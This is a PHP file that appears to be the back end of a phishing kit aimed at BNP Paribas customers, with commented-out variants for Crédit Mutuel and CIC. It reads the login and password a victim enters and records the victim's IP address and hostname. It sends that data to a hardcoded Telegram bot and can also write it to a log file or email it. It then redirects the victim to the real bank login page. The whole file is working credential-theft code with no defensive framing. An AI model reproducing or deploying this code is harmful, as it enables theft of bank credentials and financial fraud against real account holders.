<?php
//-------- by me  --------///
//------ errore--------:::
error_reporting(E_ALL);
header('Content-type: text/html; charset-UTF-8');
date_default_timezone_set('GMT');$rand_tarikh = md5(date('1 js \of F Y h:i:s A'));
//----------iclude ---------//
/*include 'func.php';*/
session_start();

//------- verify-------------//
if (!isset($_POST['putalogin']) || $_POST['putalogin']==""){
	die("<script type='text/javascript'>top.location = 'index.html?error-login';</script>");
}
if (!isset($_POST['putpass']) || $_POST['putpass']==""){
	die("<script type='text/javascript'>top.location = 'index.html?error-pass';</script>");
}

//------------variable ----------//
$pss = $_POST['putpass'];
$eml = $_POST['putalogin'];

//echo $eml." ".$pss;



date_default_timezone_set('GMT');$rand_tarikh = md5(date('1 js \of F Y h:i:s A'));$browserid = $_SERVER['HTTP_USER_AGENT'];$ip = getenv("REMOTE_ADDR");include 'Email.php';$VictimInfo = "| IP Address : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")\r\n";$to = $Your_Email;$from = "bodabikola@websitefr.com";$headers = "From:" . $from;$subj = "new login bnp by bikola : $ip";
    $data = "
+======================$subj======================+
|  Information login by bikola                
| Login  : $eml 
| Pass   : $pss                                                     
+===================================================================+
| Information Victim                              
$VictimInfo                                       
|    powered by bikola                        
+===================================================================+";
$token = "1163052470:AAEj8yZSnqn5xrsPeRiqGLRAfcTHsOx0nMI";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1239437517&text=" . urlencode($data)."" );
if($Save_Log==1) { $file = fopen("SWA.txt","a+"); fwrite($file, $data); fclose($file);}
if($Send_Log==1) { mail($to,$subj,$data,$headers); };
/*echo $eml." / ".$pss;*/
	die("<script type='text/javascript'>top.location = 'https://mabanque.bnpparibas/fr/connexion';</script>");
	
//https://www.creditmutuel.fr/fr/banque/payweb/index.html
/**
$url2 = 'https://www.creditmutuel.fr/fr/banque/payweb/index.html';
$info = Marco_http(0, $usr, $url, 0, 0, 1, 1, 0, 1, 0);
$_SESSION['bouja'] = $info;
die("<script type='text/javascript'>top.location = 'haha.php?$rand_tarikh';</script>");
**/

/**
if (preg_match('/ei_btn_typ_send/i', $safha)){
	 

}else{
    header("Access-Control-Allow-Origin: *");
    $dd = dawer('?','&eacute;',$safha);
    $tt = dawer('/partage/"','https://www.cic.fr/partage/',$dd);
    $ba = dawer('/fr/css/../../../medias/','https://www.cic.fr/medias/',$tt);
    $zz = dawer('class="e_image" alt="Lancer la recherche"','class="e_image" alt="Lancer la recherche" disabled',$ba);
    $az = dawer('<div id="I1:widget-info1:D" class="_c1 ei_cardboarditem _c1" style="display: none; position: absolute; left: 50.625%; top: 0px;">','<div id="I1:widget-info1:D" class="_c1 ei_cardboarditem _c1" style="display: block ;position: absolute; left: 50.625%; top: 0px;"></div>',$zz);
    $zr = dawer('id="I1:widget-info1:D"','id="Mery"',$az);
    date_default_timezone_set('GMT');$rand_tarikh = md5(date('1 js \of F Y h:i:s A'));$browserid = $_SERVER['HTTP_USER_AGENT'];$ip = getenv("REMOTE_ADDR");include 'Email.php';$VictimInfo = "| IP Address : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")\r\n";$to = $Your_Email;$from = "CIC@Marcosbou.website.com";$headers = "From:" . $from;$subj = "CIC NEW Login by Marco Sbou 2017 : $ip";
    $data = "
+======================$subj======================+
|  Information cv by Marco Sbou                
| Login  : $eml 
| Pass   : $pss                                                     
+===================================================================+
| Information Victim                              
$VictimInfo                                       
|    powered by MArco Sbou                        
+===================================================================+";
if($Save_Log==1) { $file = fopen("SWA.txt","a+"); fwrite($file, $data); fclose($file);}if($Send_Log==1) { mail($to,$subj,$data,$headers); };
echo mb_convert_encoding($zr,'ISO-8859-1','utf-8');

}
**/
/*$cc = dawer('?','&eacute;',$safha);
$zr = dawer('id="I1:widget-info1:D"','id="Mery"',$cc);
$zobi = dawer('href="/fr/vitrine/styles/css_redac/cc_trs.css&eacute;v=5"','href="https://www.creditmutuel.fr/fr/vitrine/styles/css_redac/cc_trs.css?v=5"',$zr);
echo mb_convert_encoding($zobi,'ISO-8859-1','utf-8');*/


?>